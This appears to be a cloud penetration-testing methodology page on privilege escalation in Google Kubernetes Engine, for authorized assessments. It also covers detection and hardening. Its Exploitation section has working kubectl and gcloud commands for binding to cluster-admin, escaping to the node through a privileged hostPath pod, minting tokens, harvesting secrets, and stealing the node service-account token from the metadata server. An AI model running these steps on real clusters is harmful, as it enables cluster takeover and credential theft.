---
cstg_id: CSTG-GCP-GKE-PRIVESC
title: "GCP Gke - Privilege Escalation"
provider: gcp
service: gke
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - container.clusters.get
  - container.clusters.getCredentials
  - container.clusters.update
  - container.nodePools.create
  - container.nodePools.update
  - container.roles.escalate
  - container.roles.bind
  - container.secrets.get
  - iam.serviceAccounts.actAs
  - iam.serviceAccounts.getAccessToken
tools:
  - gcloud CLI
  - kubectl
  - Google Kubernetes Engine REST API
  - GCP instance metadata server
  - rbac-tool / rbac-lookup
references:
  - "https://cloud.google.com/kubernetes-engine/docs/how-to/iam"
  - "https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity"
  - "https://cloud.google.com/kubernetes-engine/docs/concepts/access-scopes"
  - "https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping"
  - "https://cloud.google.com/compute/docs/metadata/overview"
  - "https://rhinosecuritylabs.com/cloud-security/kubernetes-privilege-escalation/"
  - "https://hackingthe.cloud/gcp/"
  - "https://kubernetes.io/docs/concepts/security/"
license: CC BY-SA 4.0
---

## Summary

Privilege escalation in GKE means turning a limited foothold - a low-privilege
GCP principal, a token inside a pod, or a constrained Kubernetes RBAC subject -
into broader control over the cluster, the underlying nodes, or the surrounding
GCP project. GKE is uniquely rich for escalation because two authorization
systems overlap: a permission that is benign in one plane can be a full
escalation primitive once it is used to reach the other. The canonical pattern
is *plane-crossing*: Kubernetes control over a pod becomes control over a node's
GCP service account; or a GCP IAM permission to mutate the cluster becomes
`cluster-admin` inside it.

This page enumerates escalation paths as one subsection per enabling permission
(GCP IAM permission or Kubernetes RBAC verb). For each, the primitive, the
mechanism, and the resulting privilege are described. Accurate scoping depends
on the enumeration phase ([gcp-gke-enum.md](../02-services/gcp-gke-enum.md)): a
path is only real if the assessed principal actually holds the permission and no
deny policy, IAM Condition, or admission controller blocks it. Where a path
yields a GCP service-account token, the subsequent expansion into the project is
covered in [gcp-gke-lateral.md](../04-lateral-movement/gcp-gke-lateral.md) and
[gcp-iam-privesc.md](gcp-iam-privesc.md).

## Prerequisites

Assumed-breach access: either a GCP principal with one or more of the GKE/IAM
permissions listed below, or an active Kubernetes credential (a kubeconfig, or a
ServiceAccount token mounted into a compromised pod). Establish the current
position on both planes before attempting any path:

```bash
# GCP side
gcloud auth list
gcloud projects get-iam-policy <PROJECT_ID> --flatten="bindings[].members" \
  --filter="bindings.members:$(gcloud config get-value account)" \
  --format="table(bindings.role)"

# Kubernetes side (from a kubeconfig or an in-pod token)
kubectl auth can-i --list --all-namespaces
```

## Enumeration

```bash
# GCP permissions that gate the paths below
curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"permissions":["container.clusters.update","container.nodePools.create","iam.serviceAccounts.actAs","container.clusters.getCredentials"]}' \
  "https://cloudresourcemanager.googleapis.com/v3/projects/<PROJECT_ID>:testIamPermissions"

# Kubernetes verbs that gate the in-cluster paths
kubectl auth can-i create clusterrolebindings
kubectl auth can-i escalate clusterroles
kubectl auth can-i create pods
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i create tokens --subresource=token   # SA token request
```

## Misconfigurations & Findings

- Node pools running as the **default Compute service account** (`roles/editor`)
  reachable from pods via the metadata server.
- **Workload Identity disabled** or **legacy metadata** enabled, exposing node
  credentials to any pod.
- RBAC subjects holding `create`/`patch` on `clusterrolebindings`,
  `rolebindings`, or holding the `escalate`/`bind`/`impersonate` verbs.
- Broad `create pods` / `create deployments` rights without Pod Security
  enforcement, enabling privileged or hostPath pods.
- GCP principals holding `container.clusters.update`,
  `container.nodePools.create/update`, or `iam.serviceAccounts.actAs` on the
  node/Workload-Identity SA.
- Readable Kubernetes secrets containing additional SA tokens or GCP SA keys.

## Exploitation

### container.clusters.getCredentials

This permission returns the kubeconfig/connection credentials for the cluster
but, critically, the *identity* used is the calling GCP principal mapped into
Kubernetes. In a cluster where GCP IAM is wired to powerful RBAC (for example a
binding of `roles/container.admin`, or a ClusterRoleBinding to the caller's
Google identity granting `cluster-admin`), simply fetching credentials and
issuing `kubectl` commands yields full cluster control. Always pair this
permission with an RBAC review: the escalation is the *combination* of GCP
access to the endpoint and an in-cluster binding.

```bash
gcloud container clusters get-credentials <CLUSTER> --location <LOC> --project <PROJECT_ID>
kubectl auth can-i '*' '*' --all-namespaces
```

### container.roles.bind / RBAC `bind` verb (create clusterrolebindings)

A subject that can create RoleBindings or ClusterRoleBindings can bind itself
(or a ServiceAccount it controls) to any role it is *permitted to bind* - and
without the `bind` restriction, to `cluster-admin` directly. This is the most
direct in-cluster escalation.

```bash
kubectl create clusterrolebinding pwn \
  --clusterrole=cluster-admin \
  --user="$(kubectl auth whoami -o jsonpath='{.status.userInfo.username}')"
# or bind a controlled ServiceAccount:
kubectl create clusterrolebinding pwn-sa \
  --clusterrole=cluster-admin \
  --serviceaccount=<NS>:<KSA>
```

### container.roles.escalate / RBAC `escalate` verb

Kubernetes normally prevents a subject from granting permissions it does not
itself possess. The `escalate` verb on `roles`/`clusterroles` removes that
guard, allowing the subject to add arbitrary rules (including
`apiGroups:["*"], resources:["*"], verbs:["*"]`) to a role it already holds,
escalating to cluster-admin-equivalent rights.

```bash
kubectl patch clusterrole <ROLE_I_HOLD> --type=json \
  -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'
```

### RBAC `impersonate` verb

`impersonate` on users, groups, or serviceaccounts lets the subject act as any
of them, including a known cluster-admin subject, sidestepping the need to
modify bindings.

```bash
kubectl get secrets --all-namespaces --as=system:serviceaccount:kube-system:<privileged-ksa>
```

### create pods (privileged / hostPath / hostPID)

The ability to create pods is an escalation primitive when Pod Security is not
enforced. A pod scheduled with `privileged: true`, `hostPID`, or a `hostPath`
mount of `/` breaks out onto the node, granting root on the underlying GCE VM
and access to all containers and the kubelet credentials on that node.

```yaml
apiVersion: v1
kind: Pod
metadata: { name: esc, namespace: default }
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: esc
    image: busybox
    command: ["/bin/sh","-c","sleep 1d"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes:
  - name: host
    hostPath: { path: / }
```

```bash
kubectl apply -f esc.yaml
kubectl exec -it esc -- chroot /host /bin/sh   # root on the node
```

From the node, read the node service-account token from the metadata server and
pivot into GCP (see the `node service account` path and the lateral-movement
page).

### create pods + choice of ServiceAccount (token theft)

Even without privilege, a subject who can create a pod can set
`serviceAccountName` to any ServiceAccount in the namespace, causing the
kubelet to mount that SA's token. If a more privileged KSA exists (for example
one bound to a powerful ClusterRole or annotated for Workload Identity to a
high-value GSA), this captures its identity.

```yaml
spec:
  serviceAccountName: <privileged-ksa>
  containers: [{ name: c, image: busybox, command: ["sleep","1d"] }]
```

```bash
kubectl exec pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### create serviceaccounts/token (TokenRequest)

The `create` verb on the `serviceaccounts/token` subresource lets a subject mint
a fresh token for any ServiceAccount it can name, directly assuming that SA's
RBAC identity - and, if the SA is Workload-Identity-bound, its GCP identity.

```bash
kubectl create token <privileged-ksa> -n <NS> --duration=1h
```

### get secrets (ServiceAccount token / key harvesting)

Read access to secrets yields mounted ServiceAccount tokens, image-pull
credentials, and frequently exported GCP SA JSON keys stored as app secrets.
Any harvested token/key is then replayed as that identity.

```bash
kubectl get secrets --all-namespaces -o json | \
  jq -r '.items[] | select(.type=="kubernetes.io/service-account-token")
         | "\(.metadata.namespace)/\(.metadata.name)"'
```

### node service account (metadata-server pivot)

A pod that can reach the GCE metadata server (Workload Identity not enforced, or
legacy metadata exposed) can request the node service account's access token. If
the node runs as the default Compute SA (`roles/editor`) or with broad scopes,
this is an immediate escalation from "pod" to "project editor".

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
```

### iam.serviceAccounts.actAs (Workload Identity binding)

A GCP principal holding `iam.serviceAccounts.actAs` (commonly via
`roles/iam.serviceAccountUser`) on a service account - together with the ability
to mutate Workload Identity bindings or the node SA - can attach a more
privileged GSA to a node pool or KSA, then schedule a pod that inherits it. The
`actAs` check is what makes the attachment succeed.

```bash
# Bind a controlled KSA to a high-value GSA (requires roles on the GSA)
gcloud iam service-accounts add-iam-policy-binding <HIGH_VALUE_GSA> \
  --role roles/iam.workloadIdentityUser \
  --member "serviceAccount:<PROJECT_ID>.svc.id.goog[<NS>/<KSA>]"
kubectl annotate serviceaccount <KSA> -n <NS> \
  iam.gke.io/gcp-service-account=<HIGH_VALUE_GSA>
```

### container.nodePools.create / container.clusters.update (new node pool with chosen SA)

A GCP principal that can create or update node pools can introduce a node pool
that runs as a privileged service account (or with the `cloud-platform` scope),
then schedule a workload onto it and read that SA's token via metadata - turning
GKE management rights into GCP identity theft.

```bash
gcloud container node-pools create pwn-pool --cluster <CLUSTER> --location <LOC> \
  --service-account <HIGH_VALUE_GSA> \
  --scopes https://www.googleapis.com/auth/cloud-platform \
  --num-nodes 1 --project <PROJECT_ID>
```

### roles/container.admin (full GCP-to-RBAC bridge)

`roles/container.admin` confers `container.clusters.getCredentials` plus the
ability to update clusters and, in GKE's IAM-to-RBAC mapping, effective
`cluster-admin`. A principal with this role owns the cluster outright and can
chain any in-cluster path above.

## Detection & Logging

All paths surface in **Cloud Audit Logs**, split across the two planes:

- **GCP control plane:** `container.nodePools.create`,
  `container.clusters.update`, `SetNodePoolManagement`, and
  `iam.serviceAccounts` / `setIamPolicy` mutations on a GSA (Admin Activity,
  always on). Workload Identity binding changes show as `SetIamPolicy` on the
  service account.
- **Kubernetes API server audit logs** (`resource.type="k8s_cluster"`):
  creation/patching of `clusterrolebindings`, `rolebindings`, `roles`,
  `clusterroles`; pod creation with privileged/hostPath specs; `create` on
  `serviceaccounts/token`; bulk secret reads; and `impersonate` headers.

```bash
gcloud logging read \
  'resource.type="k8s_cluster" AND
   (protoPayload.methodName:"clusterrolebindings.create"
    OR protoPayload.methodName:"serviceaccounts.token.create"
    OR (protoPayload.methodName:"pods.create"
        AND protoPayload.request.spec.containers.securityContext.privileged=true))' \
  --project=<PROJECT_ID> --freshness=2d --format=json
```

- A privileged pod followed immediately by metadata-server token requests, or a
  new node pool followed by a single scheduled workload, are high-fidelity
  escalation signatures. Security Command Center, GKE Security Posture, and
  Event Threat Detection flag privileged-container creation, suspicious RBAC
  grants, and node-SA token abuse.

## Remediation & Hardening

- Enforce **Workload Identity** and **disable legacy/GCE metadata** so pods
  cannot read node SA tokens; run nodes as a minimal, non-default SA without the
  `cloud-platform` scope.
- Apply **RBAC least privilege**; never grant `escalate`, `bind`, or
  `impersonate` broadly; restrict who can create RoleBindings/ClusterRoleBindings
  and who can create the `serviceaccounts/token` subresource.
- Enforce **Pod Security Standards** (baseline/restricted) or an admission
  controller to block privileged, hostPath, hostPID, and hostNetwork pods.
- Restrict `iam.serviceAccounts.actAs` and `roles/iam.serviceAccountUser`;
  scope `roles/container.admin` tightly.
- Use **IAM Conditions** and **deny policies** on node-pool/cluster mutation and
  on SA impersonation.
- Keep API server audit logs enabled and alert on the signatures above.

## Tools

- **gcloud CLI** and the **GKE REST API** for cluster/node-pool mutation paths.
- **kubectl** for RBAC, pod-creation, token-request, and impersonation paths.
- **rbac-tool / rbac-lookup** to surface dangerous verbs (`escalate`, `bind`,
  `impersonate`) and over-broad subjects.
- **GCP metadata server** for node-SA token retrieval from a pod/node foothold.

## References

- GKE IAM and access control - https://cloud.google.com/kubernetes-engine/docs/how-to/iam
- Workload Identity - https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity
- Node access scopes - https://cloud.google.com/kubernetes-engine/docs/concepts/access-scopes
- Kubernetes RBAC privilege-escalation prevention - https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping
- Compute metadata overview - https://cloud.google.com/compute/docs/metadata/overview
- Rhino Security Labs - Kubernetes privilege escalation - https://rhinosecuritylabs.com/cloud-security/kubernetes-privilege-escalation/
- Kubernetes security concepts - https://kubernetes.io/docs/concepts/security/
- Hacking the Cloud (GCP) - https://hackingthe.cloud/gcp/
